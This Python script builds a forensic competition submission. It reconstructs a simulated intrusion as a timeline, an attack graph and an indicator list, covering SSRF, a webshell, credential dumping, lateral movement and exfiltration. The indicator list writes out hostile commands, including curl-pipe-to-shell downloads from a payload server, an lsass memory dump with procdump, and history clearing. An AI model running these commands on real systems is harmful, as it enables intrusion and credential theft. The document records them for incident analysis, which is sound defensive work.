#!/usr/bin/env python3
"""Build the CISCN 2026 build-final submission (v2, merged with prior findings)."""
import csv
import json
from pathlib import Path

OUT = Path("/Users/mashiro/Downloads/CISCN2026Final/team54-pro/build/work/submission")
OUT.mkdir(parents=True, exist_ok=True)

TZ = "+08:00"
D = "2026-07-06"

def t(hms):
    return f"{D}T{hms}{TZ}"

# ---------------------------------------------------------------------------
# Evidence: (evidence_id, event_id, stage, timestamp)
# ---------------------------------------------------------------------------
E = [
    # recon probes (09:05)
    ("E001", "fw-20260706-144141", "recon", t("09:05:00")),
    ("E002", "waf-20260706-096141", "recon", t("09:05:01")),
    ("E003", "fw-20260706-144142", "recon", t("09:05:12")),
    ("E004", "waf-20260706-096142", "recon", t("09:05:13")),
    ("E005", "fw-20260706-144143", "recon", t("09:05:24")),
    ("E006", "waf-20260706-096143", "recon", t("09:05:25")),
    ("E007", "fw-20260706-144144", "recon", t("09:05:36")),
    ("E008", "waf-20260706-096144", "recon", t("09:05:37")),
    ("E009", "fw-20260706-144145", "recon", t("09:05:48")),
    ("E010", "waf-20260706-096145", "recon", t("09:05:49")),
    # initial access: SSRF via /oa/preview gopher redis (09:14)
    ("E011", "waf-20260706-096146", "initial_access", t("09:14:22")),
    ("E012", "artifact-pcap-20260706-072042", "initial_access", t("09:14:22")),
    ("E013", "nginx-20260706-000001", "initial_access", t("09:14:23")),
    ("E014", "oa-20260706-017559", "initial_access", t("09:14:24")),
    # execution: C2 script download from update-cache.example (09:16)
    ("E015", "audit-web-20260706-024801", "execution", t("09:16:10")),
    ("E016", "proxy-20260706-112001", "execution", t("09:16:14")),
    ("E017", "artifact-pcap-20260706-072073", "execution", t("09:16:14")),
    # reverse session back to attacker (09:16:26-30)
    ("E018", "fw-20260706-144146", "execution", t("09:16:26")),
    ("E019", "edr-20260706-010135", "execution", t("09:16:30")),
    # persistence: webshell write + first use (09:20)
    ("E020", "audit-web-20260706-024802", "persistence", t("09:20:05")),
    ("E021", "nginx-20260706-000002", "persistence", t("09:20:14")),
    ("E022", "edr-20260706-010136", "persistence", t("09:20:17")),
    # discovery on web-prod-01 (09:24)
    ("E023", "audit-web-20260706-024803", "discovery", t("09:24:00")),
    ("E024", "audit-web-20260706-024804", "discovery", t("09:24:11")),
    ("E025", "audit-web-20260706-024805", "discovery", t("09:24:22")),
    ("E026", "audit-web-20260706-024806", "discovery", t("09:24:33")),
    ("E027", "audit-web-20260706-024807", "discovery", t("09:24:44")),
    # credential access on web-prod-01 (09:31)
    ("E028", "audit-web-20260706-024808", "credential_access", t("09:31:00")),
    ("E029", "audit-web-20260706-024809", "credential_access", t("09:31:24")),
    ("E030", "audit-web-20260706-024810", "credential_access", t("09:31:48")),
    # lateral movement web -> ops-jump with stolen deploy key (09:39)
    ("E031", "fw-20260706-144147", "lateral_movement", t("09:39:15")),
    ("E032", "artifact-pcap-20260706-072344", "lateral_movement", t("09:39:15")),
    ("E033", "auth-ops-20260706-016892", "lateral_movement", t("09:39:18")),
    ("E034", "netflow-20260706-152001", "lateral_movement", t("09:39:19")),
    # discovery on ops-jump-01 (09:45)
    ("E035", "audit-ops-20260706-024801", "discovery", t("09:45:00")),
    ("E036", "audit-ops-20260706-024802", "discovery", t("09:45:16")),
    ("E037", "audit-ops-20260706-024803", "discovery", t("09:45:32")),
    # mysql login from web-prod (09:51)
    ("E038", "mysql-20260706-036001", "credential_use", t("09:51:00")),
    ("E039", "fw-20260706-144148", "credential_use", t("09:51:01")),
    # mysql discovery (09:55)
    ("E040", "mysql-20260706-036002", "discovery", t("09:55:00")),
    ("E041", "mysql-20260706-036003", "discovery", t("09:55:15")),
    ("E042", "mysql-20260706-036004", "discovery", t("09:55:30")),
    ("E043", "mysql-20260706-036005", "discovery", t("09:55:45")),
    # credential access on ops-jump (10:02-10:03)
    ("E044", "audit-ops-20260706-024804", "credential_access", t("10:02:00")),
    ("E045", "audit-ops-20260706-024805", "credential_access", t("10:02:17")),
    ("E046", "audit-ops-20260706-024806", "credential_access", t("10:02:34")),
    ("E047", "mysql-20260706-036006", "credential_access", t("10:03:00")),
    ("E048", "edr-20260706-010138", "credential_access", t("10:03:05")),
    # gitlab PAT theft + login (10:05)
    ("E049", "audit-ops-20260706-024807", "credential_access", t("10:05:00")),
    ("E050", "gitlab-20260706-017582", "credential_use", t("10:05:18")),
    # ldap enumeration from jump (10:08)
    ("E051", "netflow-20260706-152002", "discovery", t("10:08:00")),
    ("E052", "winsec-ad-20260706-000001", "credential_use", t("10:08:06")),
    ("E053", "winsec-ad-20260706-000002", "credential_use", t("10:08:11")),
    ("E054", "artifact-winsec-20260706-000001", "credential_use", t("10:08:06")),
    ("E055", "artifact-winsec-20260706-000002", "credential_use", t("10:08:11")),
    # gitlab API discovery (10:10)
    ("E056", "gitlab-20260706-017583", "discovery", t("10:10:00")),
    ("E057", "gitlab-20260706-017584", "discovery", t("10:10:12")),
    ("E058", "gitlab-20260706-017585", "discovery", t("10:10:24")),
    # bi login from jump (10:12)
    ("E059", "pgsql-20260706-028001", "credential_use", t("10:12:00")),
    ("E060", "netflow-20260706-152004", "credential_use", t("10:12:01")),
    # domain enumeration (10:13)
    ("E061", "sysmon-ad-20260706-000001", "discovery", t("10:13:00")),
    ("E062", "sysmon-ad-20260706-000002", "discovery", t("10:13:20")),
    ("E063", "sysmon-ad-20260706-000003", "discovery", t("10:13:40")),
    # CI pipeline abuse (10:18)
    ("E064", "gitlab-20260706-017586", "execution", t("10:18:00")),
    ("E065", "jenkins-20260706-018063", "execution", t("10:18:21")),
    # BI data export (10:18-10:19)
    ("E066", "pgsql-20260706-028002", "collection", t("10:18:00")),
    ("E067", "pgsql-20260706-028003", "collection", t("10:18:40")),
    ("E068", "pgsql-20260706-028004", "collection", t("10:19:20")),
    # win-admin lateral logon (10:22)
    ("E069", "winsec-win-20260706-024842", "lateral_movement", t("10:22:00")),
    ("E070", "winsec-win-20260706-024843", "privilege_escalation", t("10:22:03")),
    ("E071", "artifact-winsec-20260706-000003", "lateral_movement", t("10:22:00")),
    # ci-runner script execution (10:24)
    ("E072", "audit-ci-20260706-000001", "execution", t("10:24:00")),
    ("E073", "edr-20260706-010139", "execution", t("10:24:05")),
    # lsass dump (10:27)
    ("E074", "sysmon-win-20260706-024801", "credential_access", t("10:27:00")),
    ("E075", "artifact-sysmon-20260706-000001", "credential_access", t("10:27:00")),
    ("E076", "edr-20260706-010137", "credential_access", t("10:27:02")),
    # k8s SA token read + use (10:28)
    ("E077", "audit-ci-20260706-000002", "credential_access", t("10:28:00")),
    ("E078", "k8s-20260706-018130", "credential_use", t("10:28:12")),
    # k8s discovery (10:34)
    ("E079", "k8s-20260706-018131", "credential_access", t("10:34:00")),
    ("E080", "k8s-20260706-018132", "discovery", t("10:34:12")),
    ("E081", "k8s-20260706-018133", "discovery", t("10:34:24")),
    # finance share collection from file-srv (10:41)
    ("E082", "winsec-fil-20260706-024848", "collection", t("10:41:00")),
    ("E083", "sysmon-fil-20260706-024801", "collection", t("10:41:04")),
    ("E084", "artifact-sysmon-20260706-000002", "collection", t("10:41:04")),
    # cloud role assume + bucket list (10:42)
    ("E085", "iam-20260706-018161", "credential_use", t("10:42:00")),
    ("E086", "obj-20260706-017768", "discovery", t("10:42:09")),
    # archive finance + smb to jump (10:49)
    ("E087", "sysmon-win-20260706-024802", "collection", t("10:49:00")),
    ("E088", "netflow-20260706-152003", "collection", t("10:49:30")),
    # backup nas access denied (10:58)
    ("E089", "netflow-20260706-152005", "lateral_movement", t("10:58:00")),
    ("E090", "edr-20260706-010140", "lateral_movement", t("10:58:03")),
    # bi data upload to external storage (11:08)
    ("E091", "proxy-20260706-112002", "exfiltration", t("11:08:00")),
    ("E092", "fw-20260706-144149", "exfiltration", t("11:08:01")),
    # backup object read + upload (11:15)
    ("E093", "obj-20260706-017769", "collection", t("11:15:00")),
    ("E094", "proxy-20260706-112003", "exfiltration", t("11:15:30")),
    # staging on ops-jump (11:35)
    ("E095", "audit-ops-20260706-024808", "collection", t("11:35:00")),
    ("E096", "audit-ops-20260706-024809", "collection", t("11:35:25")),
    ("E097", "audit-ops-20260706-024810", "collection", t("11:35:50")),
    # cleanup (11:42)
    ("E098", "audit-ops-20260706-024811", "defense_evasion", t("11:42:00")),
    ("E099", "audit-ops-20260706-024812", "defense_evasion", t("11:42:11")),
    ("E100", "audit-ops-20260706-024813", "defense_evasion", t("11:42:22")),
    # final exfiltration (11:50)
    ("E101", "dns-20260706-144001", "exfiltration", t("11:50:00")),
    ("E102", "artifact-pcap-20260706-073871", "exfiltration", t("11:50:00")),
    ("E103", "proxy-20260706-112004", "exfiltration", t("11:50:12")),
    ("E104", "artifact-pcap-20260706-073875", "exfiltration", t("11:50:12")),
    ("E105", "fw-20260706-144150", "exfiltration", t("11:50:14")),
    ("E106", "ids-20260706-010047", "exfiltration", t("11:50:18")),
]

ts_of = {eid: ts for eid, _, _, ts in E}

# ---------------------------------------------------------------------------
# Timeline
# ---------------------------------------------------------------------------
TIMELINE = [
    (1, "recon", "09:05:00", "09:05:49", "E001;E002;E003;E004;E005;E006;E007;E008;E009;E010"),
    (2, "initial_access", "09:14:22", "09:14:24", "E011;E012;E013;E014"),
    (3, "execution", "09:16:10", "09:16:30", "E015;E016;E017;E018;E019"),
    (4, "persistence", "09:20:05", "09:20:17", "E020;E021;E022"),
    (5, "discovery", "09:24:00", "09:24:44", "E023;E024;E025;E026;E027"),
    (6, "credential_access", "09:31:00", "09:31:48", "E028;E029;E030"),
    (7, "lateral_movement", "09:39:15", "09:39:19", "E031;E032;E033;E034"),
    (8, "discovery", "09:45:00", "09:45:32", "E035;E036;E037"),
    (9, "credential_use", "09:51:00", "09:51:01", "E038;E039"),
    (10, "discovery", "09:55:00", "09:55:45", "E040;E041;E042;E043"),
    (11, "credential_access", "10:02:00", "10:03:05", "E044;E045;E046;E047;E048"),
    (12, "credential_access", "10:05:00", "10:05:00", "E049"),
    (13, "credential_use", "10:05:18", "10:05:18", "E050"),
    (14, "discovery", "10:08:00", "10:08:00", "E051"),
    (15, "credential_use", "10:08:06", "10:08:11", "E052;E053;E054;E055"),
    (16, "discovery", "10:10:00", "10:10:24", "E056;E057;E058"),
    (17, "credential_use", "10:12:00", "10:12:01", "E059;E060"),
    (18, "discovery", "10:13:00", "10:13:40", "E061;E062;E063"),
    (19, "execution", "10:18:00", "10:18:21", "E064;E065"),
    (20, "collection", "10:18:00", "10:19:20", "E066;E067;E068"),
    (21, "lateral_movement", "10:22:00", "10:22:00", "E069;E071"),
    (22, "privilege_escalation", "10:22:03", "10:22:03", "E070"),
    (23, "execution", "10:24:00", "10:24:05", "E072;E073"),
    (24, "credential_access", "10:27:00", "10:27:02", "E074;E075;E076"),
    (25, "credential_access", "10:28:00", "10:28:00", "E077"),
    (26, "credential_use", "10:28:12", "10:28:12", "E078"),
    (27, "credential_access", "10:34:00", "10:34:00", "E079"),
    (28, "discovery", "10:34:12", "10:34:24", "E080;E081"),
    (29, "collection", "10:41:00", "10:41:04", "E082;E083;E084"),
    (30, "credential_use", "10:42:00", "10:42:00", "E085"),
    (31, "discovery", "10:42:09", "10:42:09", "E086"),
    (32, "collection", "10:49:00", "10:49:30", "E087;E088"),
    (33, "lateral_movement", "10:58:00", "10:58:03", "E089;E090"),
    (34, "exfiltration", "11:08:00", "11:08:01", "E091;E092"),
    (35, "collection", "11:15:00", "11:15:00", "E093"),
    (36, "exfiltration", "11:15:30", "11:15:30", "E094"),
    (37, "collection", "11:35:00", "11:35:50", "E095;E096;E097"),
    (38, "defense_evasion", "11:42:00", "11:42:22", "E098;E099;E100"),
    (39, "exfiltration", "11:50:00", "11:50:18", "E101;E102;E103;E104;E105;E106"),
]

# ---------------------------------------------------------------------------
# Attack graph
# ---------------------------------------------------------------------------
NODES = [
    ("ip:198.51.100.77", "ip", "attacker external ip"),
    ("ip:203.0.113.60", "ip", "C2 payload server ip"),
    ("ip:203.0.113.77", "ip", "final exfil server ip"),
    ("domain:update-cache.example", "domain", "C2 payload domain"),
    ("domain:archive-sync-bkt.storage.example", "domain", "external object storage"),
    ("domain:cdn-sync.example", "domain", "final exfil domain"),
    ("host:web-prod-01", "host", "OA web server"),
    ("host:ops-jump-01", "host", "ops jump host"),
    ("host:ci-runner-01", "host", "CI runner"),
    ("host:gitlab-01", "host", "GitLab"),
    ("host:jenkins-01", "host", "Jenkins"),
    ("host:ad-dc-01", "host", "AD domain controller"),
    ("host:win-admin-01", "host", "admin workstation"),
    ("host:file-srv-01", "host", "file server"),
    ("host:mysql-core-01", "host", "CRM mysql"),
    ("host:pgsql-bi-01", "host", "BI pgsql"),
    ("cluster:k8s-master-01", "cluster", "k8s control plane"),
    ("account:deploy", "account", "deploy account"),
    ("account:svc_deploy", "account", "svc_deploy service account"),
    ("account:CORP\\svc_backup", "account", "svc_backup service account"),
    ("account:crm_ro", "account", "crm_ro db account"),
    ("account:bi_sync", "account", "bi_sync db account"),
    ("token:system:serviceaccount:prod:ci-runner", "token", "ci-runner k8s service account token"),
    ("database:crm", "database", "crm database"),
    ("database:bi", "database", "bi warehouse"),
    ("bucket:bucket/prod-backup", "bucket", "production backup bucket"),
    ("file:/var/www/oa/public/.cache.php", "file", "webshell .cache.php"),
    ("file:/tmp/.cache/.stage/full.tar", "file", "staged exfil archive"),
]

EDGES = [
    ("edge-001", "ip:198.51.100.77", "host:web-prod-01", "scan", "recon",
     "E001;E002;E003;E004;E005;E006;E007;E008;E009;E010"),
    ("edge-002", "ip:198.51.100.77", "host:web-prod-01", "exploit_public_service", "initial_access",
     "E011;E012;E013;E014"),
    ("edge-003", "host:web-prod-01", "domain:update-cache.example", "command_execution", "execution",
     "E015;E016;E017"),
    ("edge-004", "host:web-prod-01", "ip:198.51.100.77", "command_and_control", "execution",
     "E018;E019"),
    ("edge-005", "host:web-prod-01", "file:/var/www/oa/public/.cache.php", "webshell_upload", "persistence",
     "E020;E021;E022"),
    ("edge-006", "host:web-prod-01", "account:deploy", "credential_dump", "credential_access",
     "E028;E029;E030"),
    ("edge-007", "account:deploy", "host:ops-jump-01", "lateral_movement", "lateral_movement",
     "E031;E032;E033;E034"),
    ("edge-008", "host:ops-jump-01", "host:win-admin-01", "host_discovery", "discovery",
     "E035;E036"),
    ("edge-009", "host:ops-jump-01", "database:bi", "credential_dump", "credential_access",
     "E037"),
    ("edge-010", "account:crm_ro", "host:mysql-core-01", "credential_use", "credential_use",
     "E038;E039"),
    ("edge-011", "host:web-prod-01", "database:crm", "database_discovery", "discovery",
     "E040;E041;E042;E043"),
    ("edge-012", "host:ops-jump-01", "account:CORP\\svc_backup", "credential_dump", "credential_access",
     "E044;E045;E046"),
    ("edge-013", "host:web-prod-01", "database:crm", "credential_dump", "credential_access",
     "E047;E048"),
    ("edge-014", "host:ops-jump-01", "account:svc_deploy", "credential_dump", "credential_access",
     "E049"),
    ("edge-015", "account:svc_deploy", "host:gitlab-01", "credential_use", "credential_use",
     "E050"),
    ("edge-016", "host:ops-jump-01", "host:ad-dc-01", "network_discovery", "discovery",
     "E051"),
    ("edge-017", "account:CORP\\svc_backup", "host:ad-dc-01", "credential_use", "credential_use",
     "E052;E053;E054;E055"),
    ("edge-018", "account:svc_deploy", "host:gitlab-01", "devops_discovery", "discovery",
     "E056;E057;E058"),
    ("edge-019", "account:bi_sync", "host:pgsql-bi-01", "credential_use", "credential_use",
     "E059;E060"),
    ("edge-020", "account:CORP\\svc_backup", "host:ad-dc-01", "domain_discovery", "discovery",
     "E061;E062;E063"),
    ("edge-021", "host:gitlab-01", "host:jenkins-01", "ci_pipeline_execution", "execution",
     "E064;E065"),
    ("edge-022", "host:jenkins-01", "host:ci-runner-01", "ci_pipeline_execution", "execution",
     "E064;E065;E072;E073"),
    ("edge-023", "host:ops-jump-01", "database:bi", "data_collection", "collection",
     "E066;E067;E068"),
    ("edge-024", "account:CORP\\svc_backup", "host:win-admin-01", "lateral_movement", "lateral_movement",
     "E069;E071"),
    ("edge-025", "account:CORP\\svc_backup", "host:win-admin-01", "credential_use", "privilege_escalation",
     "E070"),
    ("edge-026", "host:win-admin-01", "account:CORP\\svc_backup", "credential_dump", "credential_access",
     "E074;E075;E076"),
    ("edge-027", "host:ci-runner-01", "token:system:serviceaccount:prod:ci-runner", "credential_dump", "credential_access",
     "E077"),
    ("edge-028", "token:system:serviceaccount:prod:ci-runner", "cluster:k8s-master-01", "credential_use", "credential_use",
     "E078"),
    ("edge-029", "token:system:serviceaccount:prod:ci-runner", "cluster:k8s-master-01", "credential_dump", "credential_access",
     "E079"),
    ("edge-030", "token:system:serviceaccount:prod:ci-runner", "cluster:k8s-master-01", "cloud_discovery", "discovery",
     "E080;E081"),
    ("edge-031", "host:win-admin-01", "host:file-srv-01", "data_collection", "collection",
     "E082;E083;E084"),
    ("edge-032", "token:system:serviceaccount:prod:ci-runner", "bucket:bucket/prod-backup", "credential_use", "credential_use",
     "E085"),
    ("edge-033", "token:system:serviceaccount:prod:ci-runner", "bucket:bucket/prod-backup", "cloud_discovery", "discovery",
     "E086"),
    ("edge-034", "host:win-admin-01", "host:ops-jump-01", "data_staging", "collection",
     "E087;E088"),
    ("edge-035", "host:ops-jump-01", "domain:archive-sync-bkt.storage.example", "exfiltration", "exfiltration",
     "E091;E092"),
    ("edge-036", "bucket:bucket/prod-backup", "host:ci-runner-01", "cloud_collection", "collection",
     "E093"),
    ("edge-037", "host:ci-runner-01", "domain:archive-sync-bkt.storage.example", "exfiltration", "exfiltration",
     "E094"),
    ("edge-038", "host:ops-jump-01", "file:/tmp/.cache/.stage/full.tar", "data_staging", "collection",
     "E095;E096;E097"),
    ("edge-039", "host:ops-jump-01", "file:/tmp/.cache/.stage/full.tar", "cleanup", "defense_evasion",
     "E098;E099;E100"),
    ("edge-040", "host:ops-jump-01", "domain:cdn-sync.example", "exfiltration", "exfiltration",
     "E101;E103"),
    ("edge-041", "host:ops-jump-01", "ip:203.0.113.77", "exfiltration", "exfiltration",
     "E102;E104;E105;E106"),
]

# ---------------------------------------------------------------------------
# IOCs
# ---------------------------------------------------------------------------
IOCS = [
    ("ip", "198.51.100.77", "09:05:00", "09:20:14", "web-prod-01", "E001;E011;E013;E018;E019;E021"),
    ("ip", "203.0.113.60", "09:16:10", "10:24:05", "web-prod-01;ci-runner-01", "E015;E016;E017;E072;E073"),
    ("ip", "203.0.113.210", "11:08:01", "11:08:01", "ops-jump-01", "E092"),
    ("ip", "203.0.113.77", "11:50:00", "11:50:18", "ops-jump-01", "E101;E104;E105;E106"),
    ("domain", "update-cache.example", "09:16:10", "09:16:30", "web-prod-01", "E015;E016;E017"),
    ("domain", "archive-sync-bkt.storage.example", "11:08:00", "11:15:30", "ops-jump-01;ci-runner-01", "E091;E094"),
    ("domain", "cdn-sync.example", "11:50:00", "11:50:18", "ops-jump-01", "E101;E103"),
    ("file", "/var/www/oa/public/.cache.php", "09:20:05", "09:20:17", "web-prod-01", "E020;E021;E022"),
    ("file", "C:\\Windows\\Temp\\ls.dmp", "10:27:00", "10:27:02", "win-admin-01", "E074;E076"),
    ("file", "C:\\Temp\\finance_q2.7z", "10:49:00", "11:35:25", "win-admin-01;ops-jump-01", "E087;E096"),
    ("file", "bi_part01.zst", "11:08:00", "11:35:25", "ops-jump-01", "E091;E096"),
    ("file", "erp_full_20260705.tar.zst", "11:15:00", "11:15:30", "ci-runner-01", "E093;E094"),
    ("file", "/tmp/.cache/.stage/full.tar", "11:35:25", "11:50:12", "ops-jump-01", "E096;E103"),
    ("account", "deploy", "09:31:24", "11:50:12", "web-prod-01;ops-jump-01", "E029;E033;E035;E049;E103"),
    ("account", "crm_ro", "09:51:00", "10:03:00", "mysql-core-01", "E038;E040;E041;E042;E043;E047"),
    ("account", "svc_deploy", "10:05:00", "10:18:21", "ops-jump-01;gitlab-01;jenkins-01", "E049;E050;E056;E057;E058;E064;E065"),
    ("account", "CORP\\svc_backup", "10:02:00", "10:49:00", "ad-dc-01;win-admin-01;file-srv-01", "E044;E045;E046;E052;E053;E054;E055;E061;E062;E063;E069;E070;E071;E074;E075;E076;E082;E083;E084;E087"),
    ("account", "bi_sync", "10:12:00", "10:19:20", "pgsql-bi-01", "E059;E066;E067;E068"),
    ("account", "gitlab-runner", "10:24:00", "11:15:30", "ci-runner-01", "E072;E077;E094"),
    ("token", "pat/deploy-token", "10:05:00", "10:05:18", "gitlab-01", "E049;E050"),
    ("token", "system:serviceaccount:prod:ci-runner", "10:28:00", "10:42:09", "k8s-master-01", "E077;E078;E079;E080;E081;E085;E086"),
    ("command", "bash -c curl -fsSL https://203.0.113.60/a.sh | sh", "09:16:10", "09:16:14", "web-prod-01", "E015;E016"),
    ("command", "python3 -c write('/var/www/oa/public/.cache.php')", "09:20:05", "09:20:05", "web-prod-01", "E020"),
    ("command", "bash -c curl -fsSL https://203.0.113.60/ci.sh | bash", "10:24:00", "10:24:05", "ci-runner-01", "E072;E073"),
    ("command", "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\ls.dmp", "10:27:00", "10:27:02", "win-admin-01", "E074;E076"),
    ("command", "robocopy \\\\file-srv-01\\finance C:\\Temp\\f /E", "10:41:04", "10:41:04", "file-srv-01;win-admin-01", "E083"),
    ("command", "7z.exe a C:\\Temp\\finance_q2.7z C:\\Temp\\f", "10:49:00", "10:49:00", "win-admin-01", "E087"),
    ("command", "tar -cf /tmp/.cache/.stage/full.tar finance_q2.7z bi_part01.zst", "11:35:25", "11:35:25", "ops-jump-01", "E096"),
    ("command", "history -c", "11:42:11", "11:42:11", "ops-jump-01", "E099"),
]

# ---------------------------------------------------------------------------
# Write outputs
# ---------------------------------------------------------------------------
with (OUT / "evidence.csv").open("w", newline="") as f:
    w = csv.writer(f)
    w.writerow(["evidence_id", "event_id", "stage"])
    for eid, event_id, stage, _ts in E:
        w.writerow([eid, event_id, stage])

with (OUT / "timeline.csv").open("w", newline="") as f:
    w = csv.writer(f)
    w.writerow(["step", "stage", "time_start", "time_end", "evidence_ids"])
    for step, stage, ts, te, evs in TIMELINE:
        w.writerow([step, stage, t(ts), t(te), evs])

nodes = [{"id": nid, "type": ntype, "label": label} for nid, ntype, label in NODES]
edges = []
for eid, src, dst, action, stage, evs in EDGES:
    refs = evs.split(";")
    times = sorted(ts_of[r] for r in refs)
    edges.append({
        "id": eid, "from": src, "to": dst, "action": action, "stage": stage,
        "time_start": times[0], "time_end": times[-1], "evidence_ids": refs,
    })
graph = {"schema_version": "1.0", "incident_id": "build-final-2026", "nodes": nodes, "edges": edges}
with (OUT / "attack_graph.json").open("w") as f:
    json.dump(graph, f, ensure_ascii=False, indent=2)

with (OUT / "ioc.csv").open("w", newline="") as f:
    w = csv.writer(f)
    w.writerow(["type", "value", "first_seen", "last_seen", "related_asset", "evidence_ids"])
    for itype, value, ts, te, asset, evs in IOCS:
        w.writerow([itype, value, t(ts), t(te), asset, evs])

manifest = {"team_id": "team54", "schema_version": "1.0", "created_at": "2026-08-13T09:30:00+08:00"}
with (OUT / "manifest.json").open("w") as f:
    json.dump(manifest, f, ensure_ascii=False, indent=2)

print(f"evidence: {len(E)} rows")
print(f"timeline: {len(TIMELINE)} steps")
print(f"graph: {len(nodes)} nodes, {len(edges)} edges")
print(f"ioc: {len(IOCS)} rows")

used = set()
for _s, _st, _ts, _te, evs in TIMELINE:
    used |= set(evs.split(";"))
all_ids = {e[0] for e in E}
print("evidence not in timeline:", all_ids - used)
print("timeline refs not in evidence:", used - all_ids)

# edge evidence coverage
edge_used = set()
for _id, _a, _b, _c, _d, evs in EDGES:
    edge_used |= set(evs.split(";"))
print("evidence not referenced by any edge:", all_ids - edge_used)
